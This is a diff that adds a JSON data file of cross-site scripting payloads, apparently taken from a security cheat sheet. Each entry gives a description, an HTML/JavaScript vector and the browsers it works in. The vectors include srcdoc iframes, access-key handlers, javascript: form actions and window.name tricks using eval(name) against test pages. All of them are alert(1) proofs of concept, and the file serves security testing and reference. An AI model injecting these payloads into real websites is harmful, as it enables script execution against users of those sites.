@@ -1,0 +1,145 @@
+[
+  {
+    "description": "Using srcdoc attribute",
+    "code": "<iframe srcdoc=\"<img src=1 onerror=alert(1)>\"><\/iframe>",
+    "browsers": [
+      "chrome",
+      "firefox",
+      "edge",
+      "safari"
+    ]
+  },
+  {
+    "description": "Using srcdoc with entities",
+    "code": "<iframe srcdoc=\"&lt;img src=1 onerror=alert(1)&gt;\"><\/iframe>",
+    "browsers": [
+      "chrome",
+      "firefox",
+      "edge",
+      "safari"
+    ]
+  },
+  {
+    "description": "Click a submit element from anywhere on the page, even outside the form",
+    "code": "<form action=\"javascript:alert(1)\"><input type=submit id=x><\/form><label for=x>XSS<\/label>",
+    "browsers": [
+      "chrome",
+      "firefox",
+      "edge",
+      "safari"
+    ]
+  },
+  {
+    "description": "Hidden inputs: Access key attributes can enable XSS on normally unexploitable elements",
+    "code": "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)",
+    "browsers": [
+      "firefox"
+    ]
+  },
+  {
+    "description": "Link elements: Access key attributes can enable XSS on normally unexploitable elements",
+    "code": "<link rel=\"canonical\" accesskey=\"X\" onclick=\"alert(1)\" \/> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)",
+    "browsers": [
+      "chrome"
+    ]
+  },
+  {
+    "description": "Download attribute can save a copy of the current webpage",
+    "code": "<a href=# download=\"filename.html\">Test<\/a>",
+    "browsers": [
+      "chrome",
+      "firefox",
+      "edge",
+      "safari"
+    ]
+  },
+  {
+    "description": "Disable referrer using referrerpolicy",
+    "code": "<img referrerpolicy=\"no-referrer\" src=\"\/\/portswigger-labs.net\">",
+    "browsers": [
+      "chrome",
+      "firefox",
+      "edge",
+      "safari"
+    ]
+  },
+  {
+    "description": "Set window.name via parameter on the window.open function",
+    "code": "<a href=# onclick=\"window.open('http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?context=js_string_single&x=%27;eval(name)\/\/','alert(1)')\">XSS</a>",
+    "browsers": [
+      "chrome",
+      "firefox",
+      "edge",
+      "safari"
+    ]
+  },
+  {
+    "description": "Set window.name via name attribute in a <iframe> tag",
+    "code": "<iframe name=\"alert(1)\" src=\"https:\/\/portswigger-labs.net\/xss\/xss.php?context=js_string_single&x=%27;eval(name)\/\/\"></iframe>",
+    "browsers": [
+      "chrome",
+      "firefox",
+      "edge",
+      "safari"
+    ]
+  },
+  {
+    "description": "Set window.name via target attribute in a <base> tag",
+    "code": "<base target=\"alert(1)\"><a href=\"http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?context=js_string_single&x=%27;eval(name)\/\/\">XSS via target in base tag</a>",
+    "browsers": [
+      "chrome",
+      "firefox",
+      "edge",
+      "safari"
+    ]
+  },
+  {
+    "description": "Set window.name via target attribute in a <a> tag",
+    "code": "<a target=\"alert(1)\" href=\"http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?context=js_string_single&x=%27;eval(name)\/\/\">XSS via target in a tag</a>",
+    "browsers": [
+      "chrome",
+      "firefox",
+      "edge",
+      "safari"
+    ]
+  },
+  {
+    "description": "Set window.name via usemap attribute in a <img> tag",
+    "code": "<img src=\"validimage.png\" width=\"10\" height=\"10\" usemap=\"#xss\"><map name=\"xss\"><area shape=\"rect\" coords=\"0,0,82,126\" target=\"alert(1)\" href=\"http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?context=js_string_single&x=%27;eval(name)\/\/\"></map>",
+    "browsers": [
+      "chrome",
+      "firefox",
+      "edge",
+      "safari"
+    ]
+  },
+  {
+    "description": "Set window.name via target attribute in a <form> tag",
+    "code": "<form action=\"http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php\" target=\"alert(1)\"><input type=hidden name=x value=\"';eval(name)\/\/\"><input type=hidden name=context value=js_string_single><input type=\"submit\" value=\"XSS via target in a form\"></form>",
+    "browsers": [
+      "chrome",
+      "firefox",
+      "edge",
+      "safari"
+    ]
+  },
+  {
+    "description": "Set window.name via formtarget attribute in a <input> tag type submit",
+    "code": "<form><input type=hidden name=x value=\"';eval(name)\/\/\"><input type=hidden name=context value=js_string_single><input type=\"submit\" formaction=\"http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type submit\"></form>",
+    "browsers": [
+      "chrome",
+      "firefox",
+      "edge",
+      "safari"
+    ]
+  },
+  {
+    "description": "Set window.name via formtarget attribute in a <input> tag type image",
+    "code": "<form><input type=hidden name=x value=\"';eval(name)\/\/\"><input type=hidden name=context value=js_string_single><input name=1 type=\"image\" src=\"validimage.png\" formaction=\"http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php\" formtarget=\"alert(1)\" value=\"XSS via formtarget in input type image\"></form>",
+    "browsers": [
+      "chrome",
+      "firefox",
+      "safari"
+    ]
+  }
+]
